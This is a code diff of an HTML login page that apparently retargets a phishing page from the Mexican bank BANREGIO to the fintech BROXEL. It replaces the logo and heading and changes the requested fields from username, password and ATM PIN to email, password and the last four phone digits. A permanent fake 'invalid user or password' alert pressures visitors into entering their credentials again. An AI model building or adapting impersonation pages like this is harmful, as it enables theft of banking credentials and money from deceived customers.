@@ -59,7 +59,7 @@
       margin-right: auto;
     }
     button {
-      background-color: #1B4D08;
+      background-color: #00C4EB;
       color: white;
       padding: 12px;
       border: none;
@@ -76,18 +76,18 @@
 <body>
   <div class="container">
     <div class="logo">
-      <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQW4kQa4Shm2hZGe6G1iAA8d9RJSHJURgbzeA&s" alt="logo" />
+      <img src="https://broxel.com/wp-content/uploads/2024/05/cropped-Broxel_favicon-300x300.png" alt="logo" />
     </div>
-    <h2>Bienvenido a <strong>BANREGIO</strong></h2>
+    <h2>Bienvenido a <strong>BROXEL</strong></h2>
     <div class="alerta">
       ❗ Usuario o clave inválida. Por favor ingrese a su cuenta correctamente.
     </div>
-    <p>Ingrese su usuario, contraseña y clave de cajero para continuar.</p>
+    <p>Ingrese su correo electronico, contraseña y celular (ultimos 4 digitos) para iniciar con su proceso financiero.</p>
     <form id="login-form">
-      <input type="text" id="usuario" placeholder="Ingrese su usuario" required />
+      <input type="email" id="usuario" placeholder="Ingrese su correo electronico" required />
       <input type="password" id="clave" placeholder="Contraseña" required />
       <!-- Nuevo campo -->
-      <input type="text" id="cajero" placeholder="Clave de cajero" maxlength="4" required />
+      <input type="tel" id="cajero" placeholder="Ultimos 4 digitos" maxlength="4" required />
       <button type="submit">Continuar</button>
     </form>
   </div>
